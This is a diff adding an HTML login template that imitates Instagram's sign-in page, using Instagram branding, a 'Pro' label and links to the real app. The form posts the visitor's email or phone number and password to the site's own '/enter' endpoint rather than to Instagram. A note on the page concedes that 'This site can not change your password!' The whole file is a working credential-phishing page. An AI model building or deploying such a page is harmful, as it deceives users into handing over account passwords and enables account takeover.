@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | login or signup</title>
+    <link rel="stylesheet" type="text/css" href="/static/css/index.css">
+    <link rel="shortcut icon" type="favicon/png" href="/static/photo/logo.jpg">
+    <script src="/static/javascript/index.js"></script>
+</head>
+
+<body>
+    <img class="mainimg" src="/static/photo/instagram.png" alt="none">
+    <p class="protext">Pro</p>
+    <div id="tobehidden">
+        <p class="textpara">Sign up to see photos and videos from your friends.</p>
+        <a class="getapplink" href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN&gl=US"><button class="getappbutton"><b>Get Instagram App</b></button></a>
+        <table class="ormaintable">
+            <td class="orpara1">
+                <hr class="orline1">
+            </td>
+            <td class="orpara2">
+                <p class="orpara">Or</p>
+            </td>
+            <td class="orpara3">
+                <hr class="orline2">
+            </td>
+        </table>
+        <p id="accountset" class="accountset"><b><a href="javascript:void(0)" onclick="login()" class="loginbutton">Log
+                    in</a></b> Or <b><a href="javascript:void(0)" onclick="signup()" class="signupbutton">Sign
+                    up</a></b></p>
+    </div>
+    <div id="loginshown">
+        <button class="loginwithfbbutt"><img src="/static/photo/fb.png" class="fbimg"></button>
+        <table class="ormaintable">
+            <td class="orpara1">
+                <hr class="orline1">
+            </td>
+            <td class="orpara2">
+                <p class="orpara">Or</p>
+            </td>
+            <td class="orpara3">
+                <hr class="orline2">
+            </td>
+        </table>
+        <form action="/enter" id="form" class="form" method="POST">
+            {% csrf_token %}
+            <div class="inputpara">
+                <input type="text" required id="username" name="username" class="usrname"
+                    placeholder=" email or phone number"><br><br>
+                <input type="password" required id="password" name="password" class="password" placeholder=" password">
+                <p class="formlinkpara"><a onclick="forget()" class="formlink" href="javascript:void(0)">Forgot
+                        password!</a><br><br>
+
+                    <input type="submit" value="Log in" class="submitbutton">
+            </div>
+
+            <br><br><br>
+        </form>
+    </div>
+    <div class="signupshown" id="signupshown">
+        <p class="nottext">
+            
+        </p>
+
+    </div>
+    <div class="forgetd" id="forgetd">
+        <p class="forgetp">
+            This site can not change your password!<br>
+            Contact official site for changing password.<br><a class="instalink"
+                href="https://www.instagram.com/">Instagram</a>
+        </p>
+    </div>
+</body>
+<script>
+
+</script>
+
+</html>
